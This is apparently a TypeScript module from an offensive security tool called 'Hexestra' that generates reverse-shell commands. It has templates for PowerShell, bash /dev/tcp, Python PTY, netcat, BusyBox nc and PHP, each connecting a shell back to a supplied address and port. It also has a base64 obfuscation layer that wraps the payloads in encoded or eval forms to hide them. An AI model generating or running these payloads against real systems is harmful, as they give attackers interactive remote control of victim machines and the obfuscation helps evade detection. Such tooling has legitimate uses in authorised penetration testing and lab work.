import {
  isLoopbackShellPeer,
  type ShellConnectCommandRequest,
  type ShellConnectCommandResult,
  type ShellConnectObfuscation,
  type ShellConnectTemplateId,
  type ShellConnectTemplateSummary,
} from '../contracts/shell';
import { assertShellId } from './shell-contract';

type TemplateDefinition = ShellConnectTemplateSummary & {
  build: (address: string, port: number) => string;
};

const TEMPLATE_DEFINITIONS: readonly TemplateDefinition[] = [
  {
    id: 'powershell-tcp',
    label: 'PowerShell TCP',
    target: 'Windows',
    runtime: 'Windows PowerShell or PowerShell 7',
    shell: 'PowerShell',
    pty: 'partial',
    note: 'Interactive text channel without native terminal resize support.',
    build: (address, port) => `powershell -NoProfile -Command "$client=New-Object System.Net.Sockets.TCPClient('${address}',${port});$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($read=$stream.Read($buffer,0,$buffer.Length)) -ne 0){$command=(New-Object Text.ASCIIEncoding).GetString($buffer,0,$read);$output=(Invoke-Expression $command 2>&1 | Out-String);$prompt=$output+'PS '+(Get-Location).Path+'> ';$bytes=[Text.Encoding]::ASCII.GetBytes($prompt);$stream.Write($bytes,0,$bytes.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    id: 'bash-tcp',
    label: 'Bash TCP',
    target: 'Linux / WSL',
    runtime: 'Bash with /dev/tcp support',
    shell: '/bin/bash',
    pty: 'partial',
    note: 'Interactive Bash channel; job control and terminal resize are limited.',
    build: (address, port) => `bash -c 'bash -i >& /dev/tcp/${address}/${port} 0>&1'`,
  },
  {
    id: 'python3',
    label: 'Python 3 PTY',
    target: 'Linux / WSL',
    runtime: 'Python 3',
    shell: '/bin/sh',
    pty: 'native',
    note: 'Allocates a local PTY before attaching the socket.',
    build: (address, port) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${address}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`,
  },
  {
    id: 'netcat',
    label: 'Netcat',
    target: 'Linux / WSL',
    runtime: 'Netcat with -e support',
    shell: '/bin/sh',
    pty: 'none',
    note: 'The OpenBSD Netcat variant usually omits -e; use only when supported.',
    build: (address, port) => `nc ${address} ${port} -e /bin/sh`,
  },
  {
    id: 'busybox-netcat',
    label: 'BusyBox Netcat',
    target: 'Linux / embedded',
    runtime: 'BusyBox with nc applet',
    shell: '/bin/sh',
    pty: 'none',
    note: 'Minimal text channel intended for a local BusyBox fixture.',
    build: (address, port) => `busybox nc ${address} ${port} -e /bin/sh`,
  },
  {
    id: 'php-cli',
    label: 'PHP CLI',
    target: 'Linux / WSL',
    runtime: 'PHP CLI with proc_open enabled',
    shell: '/bin/sh',
    pty: 'none',
    note: 'Requires CLI PHP and proc_open; no native PTY or resize support.',
    build: (address, port) => `php -r '$s=fsockopen("${address}",${port});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($p);'`,
  },
] as const;

const TEMPLATES_BY_ID = new Map<ShellConnectTemplateId, TemplateDefinition>(
  TEMPLATE_DEFINITIONS.map((template) => [template.id, template]),
);

export function listShellConnectTemplates(): ShellConnectTemplateSummary[] {
  return TEMPLATE_DEFINITIONS.map(publicTemplate);
}

export function buildShellConnectCommand(input: ShellConnectCommandRequest): ShellConnectCommandResult {
  assertShellId(input.projectId, 'project identifier');
  assertShellId(input.listenerId, 'listener identifier');
  const template = TEMPLATES_BY_ID.get(input.templateId);
  if (!template) throw new Error('Unknown Shell connection template');
  const callbackAddress = normalizeCallbackAddress(input.callbackAddress);
  const callbackPort = normalizePort(input.callbackPort);
  const obfuscation = normalizeObfuscation(input.obfuscation);
  const plain = template.build(callbackAddress, callbackPort);
  const command = applyObfuscation(plain, input.templateId, obfuscation);
  const localOnly = isLoopbackShellPeer(callbackAddress) && callbackAddress.includes('.');
  return {
    listenerId: input.listenerId,
    template: publicTemplate(template),
    callbackAddress,
    callbackPort,
    command,
    localOnly,
    obfuscation,
    warning: 'Hexestra never executes this command automatically.',
  };
}

function publicTemplate(template: TemplateDefinition): ShellConnectTemplateSummary {
  return {
    id: template.id,
    label: template.label,
    target: template.target,
    runtime: template.runtime,
    shell: template.shell,
    pty: template.pty,
    note: template.note,
  };
}

function normalizeCallbackAddress(value: unknown) {
  if (typeof value !== 'string') throw new Error('Callback address must be a valid IPv4 address');
  const address = value.trim();
  if (!/^\d{1,3}(?:\.\d{1,3}){3}$/.test(address)) {
    throw new Error('Callback address must be a valid IPv4 address');
  }
  const octets = address.split('.').map(Number);
  if (octets.some((octet) => octet < 0 || octet > 255)) {
    throw new Error('Callback address must be a valid IPv4 address');
  }
  // Reject wildcard, broadcast, and reserved ranges that are never valid listener addresses
  if (octets[0] === 0 || octets[0] === 255
    || (octets[0] === 127 && octets.every((o) => o === 0 || o === 255))
    || (octets[0] >= 224)) {
    throw new Error('Callback address is not a valid unicast listener address');
  }
  return address;
}

function normalizePort(value: unknown) {
  if (typeof value !== 'number' || !Number.isInteger(value) || value < 1 || value > 65_535) {
    throw new Error('Callback port must be an integer from 1 to 65535');
  }
  return value;
}

function normalizeObfuscation(value: unknown): ShellConnectObfuscation {
  if (value === 'base64') return 'base64';
  return 'none';
}

// --- Obfuscation ---

function applyObfuscation(plain: string, templateId: ShellConnectTemplateId, mode: ShellConnectObfuscation): string {
  if (mode === 'none') return plain;
  if (mode === 'base64') return applyBase64Obfuscation(plain, templateId);
  return plain;
}

function applyBase64Obfuscation(plain: string, templateId: ShellConnectTemplateId): string {
  switch (templateId) {
    case 'powershell-tcp': {
      // Extract the PowerShell script (everything after "-Command ") and encode as UTF-16LE base64
      const prefix = 'powershell -NoProfile -EncodedCommand ';
      const script = plain.slice('powershell -NoProfile -Command '.length);
      // Strip surrounding double quotes added by the template
      const inner = script.startsWith('"') && script.endsWith('"') ? script.slice(1, -1) : script;
      return prefix + toPowerShellBase64(inner);
    }
    case 'bash-tcp': {
      // Wrap: echo <b64> | base64 -d | bash
      const payload = plain.slice("bash -c '".length).replace(/'$/, '');
      return `bash -c 'echo ${toBase64(payload)}|base64 -d|bash'`;
    }
    case 'python3': {
      // Wrap: python3 -c "exec(__import__('base64').b64decode('...').decode())"
      const payload = plain.slice("python3 -c '".length).replace(/'$/, '');
      return `python3 -c "exec(__import__('base64').b64decode('${toBase64(payload)}').decode())"`;
    }
    case 'netcat':
    case 'busybox-netcat': {
      // Wrap: sh -c "$(echo <b64> | base64 -d)"
      return `sh -c "$(echo ${toBase64(plain)}|base64 -d)"`;
    }
    case 'php-cli': {
      // Wrap: php -r 'eval(base64_decode("..."));'
      const payload = plain.slice("php -r '".length).replace(/'$/, '');
      return `php -r 'eval(base64_decode("${toBase64(payload)}"));'`;
    }
    default:
      return plain;
  }
}

function toBase64(value: string): string {
  return Buffer.from(value, 'utf8').toString('base64');
}

function toPowerShellBase64(value: string): string {
  // PowerShell -EncodedCommand expects UTF-16LE encoded base64
  return Buffer.from(value, 'utf16le').toString('base64');
}
